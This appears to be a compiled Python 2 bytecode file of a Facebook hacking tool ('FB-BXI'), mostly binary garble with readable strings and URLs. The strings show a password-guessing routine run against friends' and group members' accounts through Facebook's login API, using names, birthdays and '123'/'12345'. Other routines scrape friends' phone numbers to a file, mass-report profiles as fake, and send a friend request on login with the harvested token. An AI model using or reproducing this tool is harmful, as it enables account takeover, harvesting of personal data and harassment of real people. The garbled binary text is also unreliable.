�
���c           @   s`  e  Z e r# d  d  Z � � Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l
 Z
 d d l m Z y d d l Z Wn e k
 r� e j d � n Xd d l m Z d d l m Z y d d l Z Wn e k
 r8e j d � n Xe e � e j d � e j �  Z e j e  � e j e j j �  d	 d
 �d3 g e _ e j d
 � Z  d �  Z! d �  Z" d Z# d Z$ d Z% d Z& d Z' d Z( d Z) d Z* d Z+ d Z, d e# e( e$ e& e' f Z- d e# e( e' f Z. d �  Z/ d  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 g  Z7 g  Z8 g  Z9 g  Z: g  Z; g  Z< g  Z= g  Z> g  Z? g  Z@ d ZA d �  ZB d �  ZC d  �  ZD d! �  ZE d" �  ZF d# �  ZG d$ �  ZH d% �  ZI d& �  ZJ d' �  ZK d( �  ZL d) �  ZM d* �  ZN d+ �  ZO d, �  ZP eQ d- � ZR d. �  ZS d/ �  ZT d0 �  ZU d1 �  ZV eW d2 k r\eB �  n  d S(4   i    i����N(   t
   ThreadPools   pip2 install requests(   t   ConnectionError(   t   Browsers   pip2 install mechanizet   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s   %S:%M:%Hc           C   s   d GHt  j j �  d  S(   Ns   [1;91m[!] Program Closed(   t   ost   syst   exit(    (    (    s
   820292037o.pyt   quit   s    c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g{�G�z�?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s
   820292037o.pyt   loading!   s    
s   [1;91ms   [1;95ms   [1;97ms   [1;92ms   [1;0ms   [1;93ms   [1;32m[[1;36m+[1;32m][0ms   [1;32m[[1;31m![1;32m][0ms   [1;32mSuccessful[0ms   [1;31mFailed[0ms^  %s

    ______ ____        ______   _______
   |  ____|  _ \      |  _ \ \ / /_   _|
   | |__  | |_) |_____| |_) \ V /  | |
   |  __| |  _ <______|  _ < > <   | |
   | |    | |_) |     | |_) / . \ _| |_
   |_|    |____/      |____/_/ \_\_____|




                 %s v 1.1.1 %s -  
              =====[ bxi2 ]=====
              %s By SPIDEY-FB %s 
s  %s

    ______ ____        ______   _______ 
   |  ____|  _ \      |  _ \ \ / /_   _|
   | |__  | |_) |_____| |_) \ V /  | |  
   |  __| |  _ <______|  _ < > <   | |  
   | |    | |_) |     | |_) / . \ _| |_ 
   |_|    |____/      |____/_/ \_\_____|

             %s  v 1.1.1
     %s 
c           C   s   t  t d � d  S(   Ns   
[*] Please Wait... 
(   R   t   G(    (    (    s
   820292037o.pyt   loadX   s    s   ids.txtc          C   s  t  j d � y t d d � }  t �  Wn�t t f k
 rt  j d � t GHt d t GHt	 t
 d t d t � } t
 j
 t
 d t d t � } t  j d � t �  y t j d � Wn$ t j k
 r� d	 t GHt �  n Xt t j _ t j d
 d � | t j d <| t j d
 <t j �  t j �  } d | k r�y;d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d  6d! d" 6} t j d# � } | j | � | j �  } | j i | d$ 6� d% } t j | d& | �} t  j! | j" � }	 t d d' � }
 |
 j# |	 d( � |
 j$ �  d) GHt j% d* |	 d( � t  j d+ � t& j' d, � t �  Wq�t j( j) k
 r�t d- GHt* �  q�Xn  d. | k r�d/ GHt  j d0 � t& j' d, � t* �  qd1 GHt  j d0 � t& j' d, � t+ �  n Xd  S(2   Nt   clears	   login.txtt   rs       Login Your Facebook Accounts
       Email s    > s
       Paswd s   https://m.facebook.coms+   
[1;91m[!] Please Check your Connection!

t   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens   
[#] Login Successfully!!sM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s=   xdg-open https://youtube.com/channel/UCBrLN3Iba0YC22sLeVFdBQwi   s!   
[!] Please Check your Connectiont
   checkpoints3   
[1;91m[!] [1;93mYour Account Has Been Checkpoints   rm -rf login.txts   
[1;91m[!] Login Failed!(,   R   t   systemt   opent   menut   KeyErrort   IOErrort   banner2R   t   Nt	   raw_inputt   Vt   Rt   Wt   getpassR   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR
   t   closet   postR   R
   t
   exceptionsR   R   t   login(   t   tokett   idt   pwdt   urlR(   t   datat   xt   aR   R   t   zedd(    (    s
   820292037o.pyRO   q   sl    



	


S



	




c          C   sH  y t  d d � j �  }  WnH t k
 rc t j d � t d GHt j d � t j d � t �  n� Xyv t	 j
 d |  � } t j | j
 � } | d } | d	 } t	 j
 d
 |  � } t j | j
 � } t | d d � } Wnf t k
 rt j d � t j d � t j d � t �  n( t	 j j k
 rBt GHd
 GHt �  n Xt j d � t GHt d t d t | t d GHt d( t d t t d t d) t GHt d t d GHt d t d GHt d t d GHt d t d GHt d t d GHt d t d  GHt d! t d" GHt d# t d$ GHt d% t d& GHd' GHt �  d  S(*   Ns	   login.txtR   R   s   [!] Token not founds   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRQ   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts'   [1;91m[!]Please Check your Connection!s    Welcomes    [ s    ] i   t   -s
   [ [1;97mMenus    ]s    {1}s    Fbcracks    {2}s    Dump Group ID'ss    {3}s    Dump Phone Numberss    {4}s    Profile Guards    {5}s    Auto Reactions    {6}s    Auto Reports    {7}s
    Developers    {8}s    Logouts    {0}s    Exitt    s   ---------------s   ---------------(   R.   t   readR1   R   R-   R6   R   R
   RO   RG   RH   RI   RJ   RK   t   strR0   RN   R   t   bannerR   R5   R3   R   R7   t   pilih(   RP   t   otwRV   t   namaRQ   t   otst   bt   sub(    (    s
   820292037o.pyR/   �   sP    

	









!)c          C   s�  t  t d t d t � }  |  d k r7 d GHt �  n[|  d k rM t �  nE|  d k rc t �  n/|  d k ry t �  n|  d k r� t �  n|  d	 k r� t	 �  t
 j d
 � n� |  d k r� d GHt �  n� |  d
 k r
t
 j d � d GHd GHt d GHt  d � t �  n� |  d k r0t
 j d � t �  nb |  d k r�t
 j d � t d t GHt  t d t d t d t � t �  n t d GHt �  d  S(   Ns   choose[bxi2] > s   ▶ R\   s   [1;91m [!] Empty commandR   t   2t   3t   4t   5i   t   6s   Not Available Nowt   7R   sQ   [1;93mAuthor : [1;92mMr.KaitoX
 [1;93mTeam : [1;92m join us on other plateforms 
 [1;93mFacebook : [1;92mhttps://facebook.com/superhackers 
[1;93m Github : [1;92mhttps://www.github.com/spidey-fb
[1;93m YouTube : [1;92mhttps://youtube.com/channel/UCBrLN3Iba0YC22sLeVFdBQw 
033[1;93m Telegram :[1;92mhttps://t.me/binyamin_binnis   
s/   special thanks : 
(1) binyamin-binni
 (2)bcoders   
[1;91m[ [1;97mBack [1;91m]t   8s   rm -rf login.txtR$   s   Bye Bye  <3s   [ t   Quits    ]s    [+] Wrong Command!(   R4   R   R6   R7   R`   t   supert   dumpgt   phonet   guardt	   autolikerR   R
   R/   R   R-   R   R3   (   RW   (    (    s
   820292037o.pyR`   �   sF    






	





"
	c          C   s�   y� t  j d � t GHt t d t d t � }  d |  } | } t j | � t t d t d t d t d t d t d	 t � } t	 �  SWn t
 �  n Xd  S(
   NR   s   [+]s    Enter Target Id: s   https://m.facebook.com/s   [*] s   Do You Want To Report 
s    [y/yes] :
s	    RootSec s   ▶ (   R   R-   R_   R4   R6   R   R7   R9   R.   t   repR/   (   RQ   t   myRS   t   dray(    (    s
   820292037o.pyt   report  s    


<c          C   sm   t  t d � }  |  j �  } t | k rb t d GHt j d � t j t d � t j d � t �  St �  Sd  S(   NR   s   .  Oops 405i   s   Error While Reporting the Id(	   R.   t   idsR]   RQ   R6   R   R
   t   test1t   test2(   RU   t   y(    (    s
   820292037o.pyRs     s    	

c          C   s�   t  j �  j �  }  t j |  d d �} t | � d k r� xN | j d d t �D]4 } d | d k rO | d } t  j | � t	 �  SqO Wn  d  S(   Nt   featuress   html.parseri    RV   t   hreft   rapid_report(
   R9   t   responseR]   t   bs4t
   BeautifulSoupt   lent   find_allR<   R.   Ry   (   t   _bst   bbRU   t   _cadow(    (    s
   820292037o.pyRx     s    	

c          C   s`   yA t  t j _ t j d d � d g t j d <t j �  t �  SWn t k
 r[ }  d GHn Xd  S(   NR   i    t   profile_fake_accountt   tags    [+] Bad404(	   R<   R9   R=   R>   R?   R@   RA   t   test3t	   Exception(   t   f(    (    s
   820292037o.pyRy   )  s    
c          C   s`   yA t  t j _ t j d d � d g t j d <t j �  t �  SWn t k
 r[ }  d GHn Xd  S(   NR   i    t   FRX_PROFILE_REPORT_CONFIRMATIONt
   action_keys
       Bad405(	   R<   R9   R=   R>   R?   R@   RA   t   _test4R�   (   R�   (    (    s
   820292037o.pyR�   3  s    
c          C   s�   y� t  t j _ t j d d � d g t j d <t j �  t t d � }  |  j	 t
 � d GHt j d � t
 d GHt j d	 � t �  Wn t k
 r� } d
 GHn Xd  S(   NR   i    t   yest   checkedR*   R\   i   s   [-]Reported i   s
       Bad406(   R<   R9   R=   R>   R?   R@   RA   R.   Rw   R
   t   _idR   R
   R   R   R�   (   t   jjR�   (    (    s
   820292037o.pyt   test4=  s    


	
c          C   s�   t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t GHt	 d GHt	 d GHt	 d	 GHt	 d
 GHt	 d GHt	 d GHt
 d
 GHt �  d  S(   NR   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   s   1. [1;95mLikes   2. [1;92mLoves
   3. [1;93mWows   4. [1;93mHahas
   5. [1;94mSads   6. [1;91mAngrys   0. [1;97mBack(   R   R-   R.   R]   R1   R   R
   RO   R_   R   R6   t   react(   RP   (    (    s
   820292037o.pyRr   R  s$    




							c          C   s�   t  d � }  |  d k r" t �  n� |  d k r> d a t �  n� |  d k rZ d a t �  n� |  d k rv d a t �  n~ |  d	 k r� d
 a t �  nb |  d k r� d a t �  nF |  d
 k r� d a t �  n* |  d k r� t �  n d t d GHt �  d  S(   Ns   [1;91m-►[1;97m R\   R   t   LIKERf   t   LOVERg   t   WOWRh   t   HAHARi   t   SADRj   t   ANGRYR$   s   [1;91m[✖] [1;97ms    [1;91mTidak ada(   R4   R�   t   tipet   rootR/   t   aksi(   t   kai(    (    s
   820292037o.pyR�   h  s2    








c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n^Xt  j d � t GHd t	 d	 t
 GHt d
 � } t d � } y� t j
 d | d
 | d |  � } t j | j � } t d � d GHxo | d d D]_ } | d } t j | � t j d | d t d |  � d | d  j d d � d t GHq� WHd t t t � � GHt d � t �  Wn> t k
 r�d GHt d � t �  n t k
 r�t �  n Xd  S(   NR   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   i
   t    s   [ Auto React ]
s,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s*   [1;91m[✺] [1;92mPlease wait [1;97m...R\   t   feedRT   RQ   s   /reactions?type=s   &access_token=s   [1;92m[[1;97ms   
s   ... [1;92m] [1;97ms!   
[1;91m[+][1;97m Result [1;96ms   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Wrong IDs
             (   R   R-   R.   R]   R1   R   R
   RO   R_   R   R3   R4   RG   RH   RI   RJ   RK   R   t   reaksit   appendRM   R�   t   replaceR^   R�   R/   R0   t   KeyboardInterrupt(   RP   t   idet   limitt   oht   ahRV   Rz   (    (    s
   820292037o.pyR�   �  sB    




#


!%




c           C   s�   t  j d � y t d d � j �  a Wn; t k
 rc t d GHt  j d � t j d � t	 �  n Xt  j d � t
 GHd t d	 t GHt d
 t
 d t d t GHt d
 t
 d
 t d t GHt d
 t
 d t d t GHd GHt �  d  S(   NR   s	   login.txtR   s   [!] Token not founds   rm -rf login.txti   i
   R�   s   [ Profile Guard ]
t   [t   01s   ] Enablet   02s	   ] Disablet   00s   ] BackR\   s
             (   R   R-   R.   R]   RP   R1   R6   R   R
   RO   R_   R   R3   R7   t   turn(    (    (    s
   820292037o.pyRq   �  s     

	


c          C   s�   t  t d t d t � }  |  d k s4 |  d k rJ d } t t | � n� |  d k sb |  d k rx d } t t | � nY |  d	 k s� |  d
 k r� t �  n7 |  d k r� t d t GHt �  n t d t GHt �  d  S(
   Nt   RootSecs    ▶ R   R�   t   trueRf   R�   t   falseR$   R�   R\   s   Can't be Empty(	   R4   R   R6   R7   t   gazRP   R/   R3   R�   (   t   gt   Ont   Off(    (    s
   820292037o.pyR�   �  s    



c         C   s3   d |  } t  j | � } t j | j � } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sRQ   (   RG   RH   RI   RJ   RK   (   RP   RS   t   rest   uid(    (    s
   820292037o.pyt
   get_userid�  s    
c         C   s�   t  |  � } d | t | � f } i d d 6d |  d 6} d } t j | d | d | �} | j GHd	 | j k r� t j d
 � t GHd GHd GHt d
 � t	 �  nK d | j k r� t j d
 � t GHd GHd GHt d
 � t	 �  n d GHt
 �  d  S(   Ns�  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st
   Authorizations"   https://graph.facebook.com/graphqlRT   t   headerss   "is_shielded":trueR   R\   s+   [1;91m[[1;96m✓[1;91m] [1;92mActivateds   
[1;91m[ [1;97mBack [1;91m]s   "is_shielded":falses-   [1;91m[[1;96m✓[1;91m] [1;91mDeactivateds   [1;91m[!] Error(   R�   R^   RG   RM   RK   R   R-   R_   R4   Rq   R/   (   RP   t   enableRQ   RT   R�   RS   R�   (    (    s
   820292037o.pyR�   �  s,    





c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n�Xt  j d � t GHt	 d � d GHy� t
 j d	 |  � } t j
 | j � } x� | d
 D]y } | d } | d } t d
 d � } t j | � t d t d t t | � GHt d t d t t | � GHd GHq� Wd t t � GH| j �  t d � t �  Wn� t t f k
 r�d GHt d � t �  no t k
 r�d GHt d � t �  nI t
 j j k
 r�d GHt �  n' t k
 r�d GHt d � t �  n Xd  S(   NR   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   s    Please wait ...R\   s2   https://graph.facebook.com/me/groups?access_token=RT   RX   RQ   s   id.txtR*   s	   [+] Name s   -> s	   [-] ID   s   
[+] Total Groups : %ss   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Stoppeds   [1;91m[!] Group not founds   [1;91m[✖] No connections#   [1;91m[!] Error when creating file(   R   R-   R.   R]   R1   R   R
   RO   R_   R   RG   RH   RI   RJ   RK   t   listgrupR�   R   R5   R7   R^   R�   RL   R4   R/   R�   t   EOFErrorR0   RN   R   R   (   RP   t   uht   groupt   pRb   RQ   R�   (    (    s
   820292037o.pyRo     sT    








	









c          C   s�  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xy t  j d � Wn t	 k
 r� n Xy�t  j d � t
 GHt d � d	 |  } t j
 | � } t j | j � } t d
 d � } x� | d D]� } t j
 d
 | d d |  � } t j | j � } yx t j | d � | j | d d � d t t t � � d | d d t | d d Gt j j �  t j d � Wq� t k
 r�q� Xq� W| j �  d GHd t t � GHt d � } t  j d
 d | � d | GHt d � t �  Wn� t k
 r2d GHt d � t �  nu t t  f k
 r^d GHt d � t �  nI t k
 r�d GHt d � t �  n# t j! j" k
 r�d  GHt# �  n Xd  S(!   NR   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   t   results&   [1;92m Getting friends mobile number s3   https://graph.facebook.com/me/friends?access_token=s   result/phone_number.txtR*   RT   s   https://graph.facebook.com/RQ   s   ?access_token=t   mobile_phones   
s	   
[1;92m s   [1;97m.[1;97m  [1;92mRX   R�   g-C��6?sD   
[1;91m[[1;96m?[1;91m] [1;92mSuccessfully get number [1;97m....s2   
[1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   
[1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   result/s2   
[1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors$   [1;91m Please Check Your Connection($   R   R-   R.   R]   R1   R   R
   RO   t   mkdirt   OSErrorR2   R   RG   RH   RI   RJ   RK   t   hpR�   R
   R^   R�   R5   R   R	   R   R0   RL   R4   t   renameR/   R�   R�   RN   R   R   (   RP   RS   R   R   t   bzt   nRU   t   done(    (    s
   820292037o.pyRp   4  sl    







4 
 

	








c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHt
 d t d GHt
 d	 t d
 GHt
 d t d GHt
 d
 t d GHd GHt
 �  d  S(   NR   s	   login.txtR   s   [1;91m[!] Token not founds   rm -rf login.txti   s    1.s    Cracked from friends Facebooks    2.s    Cracked from Group Facebooks    3.s    Cracked from File IDs    0.s    ExitR\   (   R   R-   R.   R]   RP   R1   R   R
   RO   R_   R7   R   R6   t   pilih_super(    (    (    s
   820292037o.pyRn   n  s     




c          C   s�  t  t d � }  |  d k r+ d GHt �  n|  d k r� t j d � t GHt t d t d � t j	 d t
 � } t j | j
 � } x�| d	 D] } t j | d
 � q� Wn�|  d k r�t j d � t GHt  d � } y> t j	 d
 | d t
 � } t j | j
 � } d | d GHWn' t k
 r>d GHt  d � t �  n Xt j	 d | d t
 � } t j | j
 � } x� | d	 D] } t j | d
 � qwWn� |  d k rt j d � yH t GHt  d � } x0 t | d � j �  D] }	 t j |	 j �  � q�WWq-q-Xn* |  d k rt �  n d |  d GHt �  t d t d t t t � � GHt t d � d �  }
 t d � } | j |
 t � d  GHt  d � t �  d  S(!   Ns    choose[bxi2]>[1;91m >[1;97m R\   s   [1;91m[!] Empty commandR   R   s   [+] s   Cracking Please Wait...s3   https://graph.facebook.com/me/friends?access_token=RT   RQ   Rf   s-   [1;91m[+] [1;92m Group ID  [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96m✓[1;91m] [1;92mName Group [1;91m:[1;97m RX   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=Rg   s+   [1;91m[+] [1;92m File ID  [1;91m:[1;97mR   R$   s   [1;91m[✖] [1;97ms    [1;91mCan't be Emptys   [+]s    Total ID [1;91m: [1;97ms   [=] Please wait [1;97m...
c   
      S   sS  |  } y?t  j d | d t � } t j | j � } | d d } t j d | d | d � } t j | � } d | k r� d	 | d
 | GHn�d | d k r� d
 | d | GHn�| d d } t j d | d | d � } t j | � } d | k rd	 | d
 | GHn2d | d k r6d
 | d | GHn| d d } t j d | d | d � } t j | � } d | k r�d	 | d
 | GHn�d | d k r�d
 | d | GHn�| d }	 |	 j	 d d � }
 t j d | d |
 d � } t j | � } d | k r d	 | d
 |
 GHn$d | d k rDd
 | d |
 GHn | d d } t j d | d | d � } t j | � } d | k r�d	 | d
 | GHn� d | d k r�d
 | d | GHn� | d d } t j d | d | d � } t j | � } d | k r d	 | d
 | GHn$ d | d k rDd
 | d | GHn  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R+   s   
[1;95m Email :[1;97m s    
[1;95m Password :[1;97m s   www.facebook.comt	   error_msgs   
[1;91m Email :[1;97m s    
[1;91m Password :[1;97m t   12345t	   last_namet   birthdayt   /R\   t   04(
   RG   RH   RP   RI   RJ   RK   t   urllibt   urlopenR   R�   (
   t   argt   userRV   Rd   t   pass1RT   t   qt   pass2t   pass3t   birtht   pass4t   pass5t   pass6(    (    s
   820292037o.pyt   main�  sd    
i   s   
[1;91m[+] [1;97mFinish(   R4   R   R�   R   R-   R_   R   R5   RG   RH   RP   RI   RJ   RK   RQ   R�   R0   Rn   R.   t	   readlinest   stripR/   R^   R�   R    t   map(   t   peakR   R   t   st   idgt   aswt   ret   it   idlistt   lineR�   R�   (    (    s
   820292037o.pyR�   �  sb    







!	A
t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(X   t   Falset   foot   barR   R   R   t   datetimet   randomRC   R�   t	   threadingRI   R8   R�   t   multiprocessing.poolR    RG   t   ImportErrorR-   t   requests.exceptionsR   R:   R   t   reloadt   setdefaultencodingR9   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheaderst   strftimet   infoR   R   R6   R5   R7   R   R3   t   Yt   goodt   badt   successt   failedR2   R_   R   t   backt   threadst   berhasilt   cekpointt   gagalt	   idfriendst
   idfromfriendst   idmemRQ   t   emt
   emfromfriendsR�   t
   hpfromfriendsR�   t
   reaksigrupt   komenR�   Rw   RO   R/   R`   Rv   Rs   Rx   Ry   R�   R�   Rr   R�   R�   Rq   R�   R�   R<   R�   Ro   Rp   Rn   R�   t   __name__(    (    (    s
   820292037o.pyt   <module>   s�   

�




		
		<	-	*	
			
	
			%	*				1	:		{
